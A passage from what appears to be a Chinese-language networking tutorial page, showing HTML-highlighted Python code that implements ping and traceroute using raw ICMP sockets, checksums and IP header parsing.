operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"%4.0f ms "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>during_time <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                    flag <span class="token operator">=</span> True                    receive_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span><span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    ip_head <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">parse_ip_header</span><span class="token punctuation">(</span>receive_packet<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>tries <span class="token operator">>=</span> self<span class="token punctuation">.</span>TRIES<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"request timeout"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    icmp_head <span class="token operator">=</span> receive_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span>                    type<span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>                        <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmp_head<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_UNREACHED <span class="token operator">and</span> flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Wrong!unreached net/host/port!"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_OVERTIME<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"program run over!"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    <span class="token keyword">else</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h2><p><img src="Tracert.png" alt="TRACERT"><em>代码效果</em></p><h1 id="汇总代码"><a href="#汇总代码" class="headerlink" title="汇总代码"></a>汇总代码</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">encoding</span><span class="token expression"><span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span></span></span><span class="token keyword">import</span> <span class="token module">time</span><span class="token keyword">import</span> <span class="token keyword">struct</span><span class="token keyword">import</span> <span class="token module">socket</span><span class="token keyword">import</span> <span class="token module">select</span><span class="token keyword">import</span> <span class="token module">sys</span>from typing <span class="token keyword">import</span> <span class="token module">DefaultDict</span><span class="token keyword">class</span> <span class="token class-name">PING</span><span class="token operator">:</span>    IP_HEADER_LENGTH <span class="token operator">=</span> <span class="token number">20</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送请求报文</span></span>    TYPE_ECHO_REQUEST <span class="token operator">=</span> <span class="token number">8</span>    CODE_ECHO_REQUEST_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    def <span class="token function">chesksum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token operator">:</span>        n <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        m <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">2</span>        sum <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> m<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>            sum <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>            <span class="token punctuation">)</span>  #传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位        <span class="token keyword">if</span> m<span class="token operator">:</span>            sum <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        #将高于<span class="token number">16</span>位与低<span class="token number">16</span>位相加        sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span>        sum <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span>  #如果还有高于<span class="token number">16</span>位，将继续与低<span class="token number">16</span>位相加        answer <span class="token operator">=</span> <span class="token operator">~</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        #  主机字节序转网络字节序列（参考小端序转大端序）        answer <span class="token operator">=</span> answer <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token punctuation">(</span>answer <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xff00</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> answer    def <span class="token function">request_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span> data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                     data_Sequence<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span><span class="token operator">:</span>        #  把字节打包成二进制数据        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">chesksum</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  #获取校验和        #  把校验和传入，再次打包        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    def <span class="token function">raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token char">''</span>'        连接套接字<span class="token punctuation">,</span>并将数据发送到套接字        <span class="token char">''</span>'        #实例化一个socket对象，ipv4，原套接字，分配协议端口        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span><span class="token function">getprotobyname</span><span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #记录当前请求时间        send_request_ping_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        #发送数据到网络        rawsocket<span class="token punctuation">.</span><span class="token function">sendto</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #返回数据        <span class="token keyword">return</span> send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    def <span class="token function">reply_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>                   send_request_ping_time<span class="token punctuation">,</span>                   rawsocket<span class="token punctuation">,</span>                   data_Sequence<span class="token punctuation">,</span>                   timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token keyword">while</span> True<span class="token operator">:</span>            #开始时间            started_select <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            #实例化select对象，可读rawsocket，可写为空，可执行为空，超时时间            what_ready <span class="token operator">=</span> select<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            #等待时间            wait_for_time <span class="token operator">=</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> started_select<span class="token punctuation">)</span>            #没有返回可读的内容，判断超时            <span class="token keyword">if</span> what_ready<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">:</span>  # Timeout                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>            #记录接收时间            time_received <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            #设置接收的包的字节为<span class="token number">1024</span>            received_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span><span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            #获取接收包的icmp头            icmpHeader <span class="token operator">=</span> received_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span>            #反转编码            type<span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>                <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmpHeader<span class="token punctuation">)</span>            ttl <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">parse_ip_header</span><span class="token punctuation">(</span>received_packet<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> sequence <span class="token operator">==</span> data_Sequence<span class="token operator">:</span>                <span class="token keyword">return</span> time_received <span class="token operator">-</span> send_request_ping_time<span class="token punctuation">,</span> ttl            #数据包的超时时间判断            timeout <span class="token operator">=</span> timeout <span class="token operator">-</span> wait_for_time            <span class="token keyword">if</span> timeout <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> ttl    def <span class="token function">parse_ip_header</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip_header<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token string">""</span>"        IP报文格式        <span class="token number">1.</span> <span class="token number">4</span>位IP<span class="token operator">-</span>version <span class="token number">4</span>位IP头长度 <span class="token number">8</span>位服务类型 <span class="token number">16</span>位报文总长度        <span class="token number">2.</span> <span class="token number">16</span>位标识符 <span class="token number">3</span>位标记位 <span class="token number">13</span>位片偏移 暂时不关注此行        <span class="token number">3.</span> <span class="token number">8</span>位TTL <span class="token number">8</span>位协议 <span class="token number">16</span>位头部校验和        <span class="token number">4.</span> <span class="token number">32</span>位源IP地址        <span class="token number">5.</span> <span class="token number">32</span>位目的IP地址        <span class="token operator">:</span>param ip_header<span class="token operator">:</span>        <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>        <span class="token string">""</span>"        line1 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  # 先按照<span class="token number">8</span>位、<span class="token number">8</span>位、<span class="token number">16</span>位解析        ip_version <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span>  # 通过右移<span class="token number">4</span>位获取高四位        # 报文头部长度的单位是<span class="token number">32</span>位 即四个字节        iph_length <span class="token operator">=</span> <span class="token punctuation">(</span>line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>  # 与<span class="token number">1111</span>与运算获取低四位        packet_length <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line3 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        TTL <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        protocol <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        iph_checksum <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line4 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">12</span><span class="token operator">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        src_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">inet_ntoa</span><span class="token punctuation">(</span>line4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        line5 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dst_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">inet_ntoa</span><span class="token punctuation">(</span>line5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token char">'ip_version'</span><span class="token operator">:</span> ip_version<span class="token punctuation">,</span>            <span class="token char">'iph_length'</span><span class="token operator">:</span> iph_length<span class="token punctuation">,</span>            <span class="token char">'packet_length'</span><span class="token operator">:</span> packet_length<span class="token punctuation">,</span>            <span class="token char">'TTL'</span><span class="token operator">:</span> TTL<span class="token punctuation">,</span>            <span class="token char">'protocol'</span><span class="token operator">:</span> protocol<span class="token punctuation">,</span>            <span class="token char">'iph_checksum'</span><span class="token operator">:</span> iph_checksum<span class="token punctuation">,</span>            <span class="token char">'src_ip'</span><span class="token operator">:</span> src_ip<span class="token punctuation">,</span>            <span class="token char">'dst_ip'</span><span class="token operator">:</span> dst_ip        <span class="token punctuation">&#125;</span>    def <span class="token function">ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        send<span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        sumtime<span class="token punctuation">,</span> shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> avgtime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">icmp</span><span class="token expression">数据包的构建</span></span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  # <span class="token string">"...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  #Identifier        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  #Sequence number        payload_body <span class="token operator">=</span> b<span class="token char">'abcdefghijklmnopqrstuvwabcdefghi'</span>  #data        # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n正在 Ping &#123;0&#125; [&#123;1&#125;] 具有 32 字节的数据:"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>            send <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>            #请求ping数据包的二进制转换            icmp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">request_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                            self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                            data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                                            data_Sequence <span class="token operator">+</span> i<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span>            #连接套接字<span class="token punctuation">,</span>并将数据发送到套接字            send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> addr <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">raw_socket</span><span class="token punctuation">(</span>                dst_addr<span class="token punctuation">,</span> icmp_packet<span class="token punctuation">)</span>            #数据包传输时间            times<span class="token punctuation">,</span> ttl <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">reply_ping</span><span class="token punctuation">(</span>send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span>                                         data_Sequence <span class="token operator">+</span> i<span class="token punctuation">)</span>            <span class="token keyword">if</span> times <span class="token operator">></span> <span class="token number">0</span><span class="token operator">:</span>                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"来自 &#123;0&#125; 的回复: 字节 = 32 时间 = &#123;1&#125;ms TTL = &#123;2&#125; "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>                    addr<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ttl<span class="token punctuation">[</span><span class="token char">'TTL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                accept <span class="token operator">+=</span> <span class="token number">1</span>                return_time <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>                sumtime <span class="token operator">+=</span> return_time                longtime <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>longtime<span class="token punctuation">,</span> return_time<span class="token punctuation">)</span>                shorttime <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>return_time<span class="token punctuation">,</span> shorttime<span class="token punctuation">)</span>                time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.7</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token operator">:</span>                lost <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"请求超时。"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> send <span class="token operator">==</span> <span class="token number">4</span><span class="token operator">:</span>                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;0&#125; 的 Ping 统计信息:"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">print</span><span class="token punctuation">(</span>                    <span class="token string">"\t数据包：已发送 = &#123;0&#125;,接收 = &#123;1&#125;，丢失 = &#123;2&#125;（&#123;3&#125;%丢失），\n往返行程的估计时间（以毫秒为单位）：\n\t最短 = &#123;4&#125;ms，最长 = &#123;5&#125;ms，平均 = &#123;6&#125;ms"</span>                    <span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost<span class="token punctuation">,</span> lost <span class="token operator">/</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span>                            shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> sumtime <span class="token operator">/</span> send<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">TraceRoute</span><span class="token punctuation">(</span>PING<span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送请求报文</span></span>    TYPE_ECHO_REQUEST <span class="token operator">=</span> <span class="token number">8</span>    CODE_ECHO_REQUEST_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送应答报文</span></span>    TYPE_ECHO_REPLY <span class="token operator">=</span> <span class="token number">0</span>    CODE_ECHO_REPLY_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 数据报超时报文</span></span>    TYPE_ICMP_OVERTIME <span class="token operator">=</span> <span class="token number">11</span>    CODE_TTL_OVERTIME <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 目的站不可达报文</span></span>    TYPE_ICMP_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    CODE_NET_UNREACHED <span class="token operator">=</span> <span class="token number">0</span>    CODE_HOST_UNREACHED <span class="token operator">=</span> <span class="token number">1</span>    CODE_PORT_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    MAX_HOPS <span class="token operator">=</span> <span class="token number">30</span>  # 设置路由转发最大跳数为<span class="token number">30</span>    TIMEOUT <span class="token operator">=</span> <span class="token number">1</span>  # 如果一个请求超过<span class="token number">1</span>s未得到响应，则被认定为超时    TRIES <span class="token operator">=</span> <span class="token number">3</span>  # 对于每个中间站点，探测的次数设置为<span class="token number">3</span>    def <span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span><span class="token operator">:</span>        #实例化一个socket对象，ipv4，原套接字，分配协议端口        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span><span class="token function">getprotobyname</span><span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        rawsocket<span class="token punctuation">.</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>IP_TTL<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>        #记录当前请求时间        send_request_traceroute_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        #发送数据到网络        rawsocket<span class="token punctuation">.</span><span class="token function">sendto</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #返回数据        <span class="token keyword">return</span> send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    def <span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">icmp</span><span class="token expression">数据包的构建</span></span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  # <span class="token string">"...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  #Identifier        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  #Sequence number        payload_body <span class="token operator">=</span> b<span class="token char">'abcdefghijklmnopqrstuvwabcdefghi'</span>  #data        #  把字节打包成二进制数据        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">chesksum</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  #获取校验和        #  把校验和传入，再次打包        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    def <span class="token function">traceroute</span><span 